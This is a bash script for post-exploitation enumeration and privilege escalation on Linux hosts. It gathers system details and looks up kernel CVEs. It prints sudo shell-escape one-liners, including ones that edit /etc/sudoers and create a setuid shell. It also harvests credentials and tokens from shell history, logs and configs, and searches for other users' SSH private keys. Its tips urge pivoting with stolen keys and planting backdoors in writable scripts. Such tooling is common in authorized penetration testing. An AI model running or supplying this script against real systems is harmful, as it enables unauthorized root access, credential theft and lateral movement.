#!/bin/bash

# Define log file
LOG_FILE="ultimate_enum.log"

# Clear previous log
> "$LOG_FILE"

# Color Definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Central logging function
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log "${BLUE}[*] Running enhanced low-privilege enumeration script...${NC}"
log "${BLUE}[*] Results will be saved in $LOG_FILE${NC}"

# ------------------- SYSTEM ENUMERATION -------------------
log "${YELLOW}\n[+] Host Information:${NC}"
log "Hostname: $(hostname)"
log "OS: $(uname -s) $(uname -r) $(uname -v)"
log "Architecture: $(uname -m)"

KERNEL_VERSION=$(uname -r)
log "${YELLOW}\n[+] Kernel and CPU Information:${NC}"
log "Kernel Version: $KERNEL_VERSION"
log "CPU Model: $(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)"
log "CPU Cores: $(lscpu | grep '^CPU(s):' | awk '{print $2}')"
log "Threads per Core: $(lscpu | grep 'Thread(s) per core:' | awk '{print $4}')"
log "Total Threads: $(($(nproc)))"

log "${GREEN}\n[+] TIP:${NC} Based on the system info, look for kernel-specific exploits that match version $KERNEL_VERSION."
log "${GREEN}    You can also assess performance-heavy exploits since the system has $(nproc) threads available.${NC}"

# ------------------- KERNEL EXPLOIT SUGGESTIONS -------------------
log "${YELLOW}\n[+] Searching for Known Kernel Exploits:${NC}"
curl -s "https://www.exploit-db.com/search?text=$KERNEL_VERSION" | grep -o 'CVE-[0-9]\{4\}-[0-9]\{4,5\}' | sort -u | tee -a "$LOG_FILE"

log "${GREEN}\n[+] TIP:${NC} Review the listed CVEs on Exploit-DB or Google them to find PoCs and exploitation guides."
log "${GREEN}    Use tools like searchsploit or exploitdb.com to see if any are local privilege escalation exploits relevant to your kernel.${NC}"

# ------------------- PRIVILEGE ESCALATION CHECKS -------------------
log "${YELLOW}\n[+] Checking Sudo Capabilities:${NC}"
SUDO_CMDS=$(sudo -l 2>/dev/null)

if [[ -z "$SUDO_CMDS" ]]; then
    log "${RED}[-] No sudo privileges detected.${NC}"
else
    log "$SUDO_CMDS"

    if sudo -l | grep -q "NOPASSWD"; then
        log "${GREEN}[!] Some sudo commands can be run without a password!${NC}"
    fi

    declare -A SUDO_EXPLOITS=(
        ["find"]="sudo find . -exec /bin/sh \; -quit"
        ["vim"]="sudo vim -c ':!/bin/sh'"
        ["tar"]="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        ["python3"]="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
        ["perl"]="sudo perl -e 'exec \"/bin/sh\";'"
        ["awk"]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        ["nmap"]="sudo nmap --interactive; !sh"
        ["less"]="sudo less /etc/passwd; !sh"
        ["nano"]="sudo nano /etc/sudoers"
        ["cp"]="sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh"
        ["tee"]="echo \"user ALL=(ALL) NOPASSWD:ALL\" | sudo tee -a /etc/sudoers"
        ["bash"]="sudo bash"
        ["sh"]="sudo sh"
        ["lua"]="sudo lua -e 'os.execute(\"/bin/sh\")'"
        ["ruby"]="sudo ruby -e 'exec \"/bin/sh\"'"
        ["php"]="sudo php -r 'system(\"/bin/sh\");'"
    )

    for CMD in "${!SUDO_EXPLOITS[@]}"; do
        if echo "$SUDO_CMDS" | grep -q "$CMD"; then
            log "${GREEN}[!] Exploitation Tip: Run: ${SUDO_EXPLOITS[$CMD]}${NC}"
        fi
    done
fi

# ------------------- COMMAND HISTORY CHECK -------------------
log "${YELLOW}\n[+] Checking Command History for Sensitive Information:${NC}"
CMD_HISTORY=$(grep -E "password|passwd|token|apikey|secret|sudo|su |chmod|chown|scp|ssh" ~/.bash_history ~/.zsh_history 2>/dev/null)
echo "$CMD_HISTORY" | tee -a "$LOG_FILE"

if [[ -n "$CMD_HISTORY" ]]; then
    log "${GREEN}\n[+] TIP:${NC} Shell history shows potential attack vectors."
    log "${GREEN}    You may be able to reuse sudo commands, credentials, or exploit custom tools/scripts run previously by the user.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No obvious sensitive entries found in shell history, but consider manually inspecting .bash_history or .zsh_history."
    log "${YELLOW}    Secrets or useful patterns may still be stored in non-obvious ways or buried in long command chains.${NC}"
fi

# ------------------- USER ENUMERATION -------------------
log "${YELLOW}\n[+] Enumerating System Users:${NC}"
getent passwd | awk -F: '{ print $1 " (UID: " $3 ", GID: " $4 ", Home: " $6 ", Shell: " $7 ")" }' | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Current Logged-in Users:${NC}"
who | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Last Logins:${NC}"
last -a | head -n 10 | tee -a "$LOG_FILE"

log "${GREEN}\n[+] TIP:${NC} Look for users with UID 0 (root-level), unusual shells (e.g., /bin/sh, /bin/false), or empty home directories."
log "${GREEN}    These accounts might be service users, misconfigured, or potential escalation targets if they're less secured.${NC}"

# ------------------- CRON JOB EXPLOIT CHECK -------------------
log "${YELLOW}\n[+] Checking for Scheduled Cron Jobs:${NC}"
CRON_JOBS=$(crontab -l 2>/dev/null; cat /etc/crontab /etc/cron.d/* 2>/dev/null)

if [[ -n "$CRON_JOBS" ]]; then
    log "$CRON_JOBS"
    log "${GREEN}[+] Checking for Writable Cron Scripts:${NC}"
    WRITABLE_CRON_SCRIPTS=$(find /etc/cron* -type f -writable 2>/dev/null)
    
    if [[ -n "$WRITABLE_CRON_SCRIPTS" ]]; then
        log "$WRITABLE_CRON_SCRIPTS"
    fi
else
    log "${RED}[-] No cron jobs found.${NC}"
fi

log "${GREEN}\n[+] TIP:${NC} Writable cron jobs or scripts can be hijacked to execute arbitrary code as root or another user."
log "${GREEN}    Look for scripts owned by root or run by privileged accounts — especially if you can modify them or their path dependencies.${NC}"

# ------------------- SUID & SGID BINARY CHECK -------------------
log "${YELLOW}\n[+] Searching for SUID binaries:${NC}"
find / -perm -4000 -type f 2>/dev/null | tee -a "$LOG_FILE"

SUID_RESULTS=$(find / -perm -4000 -type f 2>/dev/null)

if [[ -n "$SUID_RESULTS" ]]; then
    log "${GREEN}\n[+] TIP:${NC} Some binaries have the SUID bit set, meaning they run as their owner (often root)."
    log "${GREEN}    Check uncommon SUID binaries (outside /usr/bin or /bin) and cross-reference them on GTFOBins (https://gtfobins.github.io/) for known exploits.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No SUID binaries found. Either the system is hardened, or this user has limited visibility."
    log "${YELLOW}    Consider checking inside mounted filesystems, containers, or backups if accessible.${NC}"
fi

# ------------------- LATERAL MOVEMENT CHECKS -------------------
log "${YELLOW}\n[+] Checking for Readable Home Directories:${NC}"
find /home -maxdepth 1 -type d -perm -o+r 2>/dev/null | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Searching for Other Users' SSH Private Keys:${NC}"
find /home -type f -name "id_rsa" -o -name "*.pem" 2>/dev/null | tee -a "$LOG_FILE"

if find /home -maxdepth 1 -type d -perm -o+r 2>/dev/null | grep -q .; then
    log "${GREEN}\n[+] TIP:${NC} Some home directories are world-readable. Check for bash histories, SSH configs, or plaintext creds you can access."
fi

if find /home -type f -name \"id_rsa\" -o -name \"*.pem\" 2>/dev/null | grep -q .; then
    log "${GREEN}[+] TIP:${NC} SSH private keys found! Try using them to pivot into user accounts or onto other systems (check for reused keys)."
fi

# ------------------- CREDENTIAL DISCOVERY -------------------
log "${YELLOW}\n[+] Checking logs for sensitive information (passwords, tokens, API keys):${NC}"
grep -rniE "password|passwd|token|apikey|secret|bearer|authorization|jwt" /var/log /etc /opt /home/*/.bash_history 2>/dev/null | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Looking for high-entropy strings (potential secrets):${NC}"
find /var/log /etc /opt /home -type f -exec grep -Eo '[A-Za-z0-9+/]{30,}' {} \; 2>/dev/null | sort -u | tee -a "$LOG_FILE"

if grep -rniE "password|passwd|token|apikey|secret|bearer|authorization|jwt" /var/log /etc /opt /home/*/.bash_history 2>/dev/null | grep -q .; then
    log "${GREEN}\n[+] TIP:${NC} Sensitive credentials or tokens were found in readable files or logs."
    log "${GREEN}    Try using these values in authentication attempts, API requests, or service logins. Be sure to check if they're still valid.${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No obvious credentials found, but secrets can also be stored in configs or environment variables not matched by keywords."
    log "${YELLOW}    Consider manually inspecting key config files in /opt, /etc, and home directories for hidden creds.${NC}"
fi

# ------------------- FILE PERMISSION EXPLOITATION -------------------
log "${YELLOW}\n[+] Checking for Writable Security Files:${NC}"
find /etc -type f -perm -g=w,o=w 2>/dev/null | tee -a "$LOG_FILE"

log "${YELLOW}\n[+] Searching for Writable Root-Owned Scripts:${NC}"
find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null | tee -a "$LOG_FILE"

WRITABLE_SECURITY=$(find /etc -type f -perm -g=w,o=w 2>/dev/null | grep -q .)
WRITABLE_ROOT_SCRIPTS=$(find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null | grep -q .)

if $WRITABLE_SECURITY || $WRITABLE_ROOT_SCRIPTS; then
    log "${GREEN}\n[+] TIP:${NC} Writable config files or root-owned scripts were found. Try injecting malicious commands to escalate privileges."
    log "${GREEN}    For scripts, modify them to spawn a shell or backdoor. For configs, abuse misconfigurations (e.g., LD_PRELOAD, PATH hijacks).${NC}"
else
    log "${YELLOW}\n[+] TIP:${NC} No writable privileged files found, but keep an eye on temp folders, custom scripts, or world-writable directories."
    log "${YELLOW}    You might still find privilege escalation paths through race conditions or poorly isolated services.${NC}"
fi

# ------------------- ENUMERATION COMPLETED -------------------
log "${GREEN}\n[+] Enumeration completed. Check results in: $LOG_FILE${NC}"
